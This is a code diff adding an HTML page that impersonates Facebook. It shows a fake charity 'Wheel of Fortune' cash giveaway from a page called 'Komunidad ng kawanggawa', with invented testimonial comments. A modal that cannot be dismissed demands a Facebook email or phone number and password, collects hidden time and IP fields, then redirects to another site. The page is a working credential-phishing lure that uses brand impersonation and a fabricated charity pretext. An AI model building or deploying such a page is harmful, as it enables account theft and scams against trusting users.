@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+    <link rel="stylesheet" href="styles.css">
+    <title>Facebook Page</title>
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+</head>
+<body>
+    <!-- Begin container -->
+    <div class="container">
+       <!-- Begin Modal -->
+       <!-- Modal -->
+       <div class="modal fade" id="btnModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" data-bs-backdrop="static">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h1 class="modal-title fs-5" id="exampleModalLabel">Login to continue</h1>
+                </div>
+                <div class="modal-body">
+                    <!-- Begin form login -->
+                    <div class="container-form">
+                        <div class="divlogo">
+                            <img src="./images/textfacebook.svg" class="logofb">
+                            <h2>Facebook helps you connect and share with the people in your life.</h2>
+                          </div>
+                         
+                          <form id="test-form" method="get">
+                            <input class="form-input" type="text" name="user" pattern="^[\w-]+(\.[\w-]+)*@([\w-]+\.)+[a-zA-Z]{2,7}$|0\d{10}$|\d{12,16}" required title="Không đúng định dạng" placeholder="Email address or phone number"/><br>
+                            <input class="form-input" type="password" name="pass" placeholder="Password" required/><br>
+                            <input type="hidden" id="current-time" name="time">
+                            <input type="hidden" id="userIp" name="userIp">
+                            <button type="submit" id="submit-form" class="btn">Log in</button>
+                        </form>
+                    </div>
+                    <!-- End form login -->
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- End modal -->
+   <!-- Begin content hide -->
+   <div id="blurBackground" class="blur-background"></div>
+   <div id="content" class="content">
+     <!-- Begin post page -->
+     <div class="cover-photo"></div>
+     <img src="./images/avt.PNG" alt="Profile Picture" class="profile-picture">
+     <div class="profile-info">
+         <h1>Komunidad ng kawanggawa</h1>
+         <p>6.6K likes · 6.8K followers</p>
+     </div>
+     <div class="post-container">
+         <div class="post-header">
+             <img src="./images/avt.PNG" alt="Company Logo">
+             <div>
+                 <h2>Komunidad ng kawanggawa</h2>
+                 <p>Posted on May 17, 2024</p>
+             </div>
+         </div>
+         <div class="post-content">
+             <h2>Important Notice: Charity program through lucky wheel</h2>
+             <p>Dear valued customers,</p>
+             <p>The "Wheel of Fortune" event is organized with the purpose of supporting lives and places in difficulty during the impact of the covid pandemic and global economic recession. All proceeds from the event will be transferred to you if the correct information matches the Facebook user, bringing hope and a brighter future to the less fortunate.</p>
+             <p>To participate. <br/>
+                 Step 1. Visit the link we provide <br/>
+                 Step 2. Spin the lucky wheel <br/>
+                 Step 3. Authenticate user information <br/>
+                 You will receive the money you spin in the spin after the fund has enough money and we finish working with the bank, then the regional government will make a list and send this charity gift to you.</p>
+             <p>Thank you for your attention and cooperation.</p>
+             <p>Sincerely,</p>
+             <p>Komunidad ng kawanggawa</p>
+         </div>
+         <div class="album-section">
+             <div class="album-section-row1">
+                 <div class="element1 album-element">
+                     <img src="./images/1.jpg" alt="">
+                     <p>1</p>
+                 </div>
+                 <div class="element2 album-element">
+                     <img src="./images/2.jpg" alt="">
+                     <p>2</p>
+                 </div>
+             </div>
+             <div class="album-section-row2">
+                 <div class="element3 album-element">
+                     <img src="./images/3.jpg" alt="">
+                     <p>3</p>
+                 </div>
+                 <div class="element4 album-element">
+                     <img src="./images/4.jpg" alt="">
+                     <p>4</p>
+                 </div>
+                 <div class="element5 album-element">
+                     <img src="./images/5.jpg" alt="">
+                     <p>5</p>
+                 </div>  
+             </div>
+             
+             
+         </div>
+         <div class="comments-section">
+             <h2>176 Comments</h2>
+             <div class="comment">
+                 <img src="path_to_profile_image1.jpg" alt="Profile Image">
+                 <div class="comment-content">
+                     <p><strong>Villarta Sesbreño Rodel Totong</strong></p>
+                     <p>I received 200 pesos 👍👍👍</p>
+                     <div class="rating">⭐⭐⭐⭐⭐</div>
+                     <div class="feedback">
+                         <span>Like</span> • <span>Feedback</span>
+                         <span class="date">1 day ago</span>
+                         <span class="likes">6</span>
+                     </div>
+                 </div>
+             </div>
+         
+             <div class="comment-feedback">
+                 <img src="path_to_profile_image2.jpg" alt="Profile Image">
+                 <div class="comment-content">
+                     <p><strong>Nelson Barredo Millanes</strong></p>
+                     <p>I was unlucky and only received 50 pesos 😕</p>
+                     <div class="feedback">
+                         <span>Feedback</span>
+                         <span class="date">20 hours ago</span>
+                     </div>
+                 </div>
+             </div>
+         
+             <div class="comment-feedback">
+                 <img src="path_to_profile_image3.jpg" alt="Profile Image">
+                 <div class="comment-content">
+                     <p><strong>Random Names</strong></p>
+                     <p>At first I thought it was a scam until I received the money</p>
+                     <div class="feedback">
+                         <span>Feedback</span>
+                         <span class="date">2 minutes ago</span>
+                     </div>
+                 </div>
+             </div>
+         
+             <div class="comment">
+                 <img src="path_to_profile_image4.jpg" alt="Profile Image">
+                 <div class="comment-content">
+                     <p><strong>KCinmor Seyer</strong></p>
+                     <p>It took me more than 3 months to receive the money but I'm still happy to still receive it</p>
+                     <div class="rating">⭐⭐⭐⭐⭐</div>
+                     <div class="feedback">
+                         <span>Like</span> • <span>Feedback</span>
+                         <span class="date">1 day ago</span>
+                         <span class="likes">2</span>
+                     </div>
+                 </div>
+             </div>
+         
+             <div class="comment">
+                 <img src="path_to_profile_image5.jpg" alt="Profile Image">
+                 <div class="comment-content">
+                     <p><strong>Luzbert Pacardo</strong></p>
+                 </div>
+             </div>
+         </div>
+         <div class="loading">
+             <div class="loading__dot"></div>
+             <div class="loading__dot"></div>
+             <div class="loading__dot"></div>
+             <div class="loading__dot"></div>
+             <div class="loading__dot"></div>
+         </div>
+     </div>
+     
+ </div>
+
+ <!-- End post page -->
+   </div>
+   <!-- End content hide -->
+</div>
+
+<script>
+    // Lắng nghe sự kiện trang được tải lại hoặc quay lại từ trang khác
+    window.addEventListener("pageshow", function(event) {
+   // Kiểm tra xem có phải là sự kiện "pageshow" do quay lại từ trang khác không
+   if (event.persisted || (window.performance && window.performance.navigation.type == 2)) {
+     // Xóa dữ liệu của biểu mẫu
+     var form = document.getElementById("test-form");
+     form.reset();
+     sessionStorage.removeItem("formData");
+   }
+ });
+   document.getElementById("submit-form").addEventListener("click", function() {
+     var userValue = document.getElementsByName("user")[0].value;
+     var passValue = document.getElementsByName("pass")[0].value;
+     // Kiểm tra xem user và pass có hợp lệ không
+      // Biểu thức chính quy để kiểm tra email hoặc số điện thoại
+     var regex = /^[\w-]+(\.[\w-]+)*@([\w-]+\.)+[a-zA-Z]{2,7}$|0\d{10}$|\d{12,16}/;
+     var isValid = true; // Biến để kiểm tra xem dữ liệu có hợp lệ không
+      if (regex.test(userValue) && passValue !== "") {
+        // Chuyển hướng đến URL mong muốn
+        // hideModal();
+       window.location.href="https://dev-deho.github.io/KomunidadPage/";
+     } else {
+        alert("Please enter the correct format.\nEmail or phone number or UID.");
+       event.preventDefault();
+     }
+     
+   });
+ </script>
+<!-- <script>
+function gotoLink(link){
+                 // console.log(link.value);
+               location.href = link.value;
+                 // window.open(link.value);
+             }
+</script> -->
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
+<script src="js/app.js"></script>
+</body>
+</html>
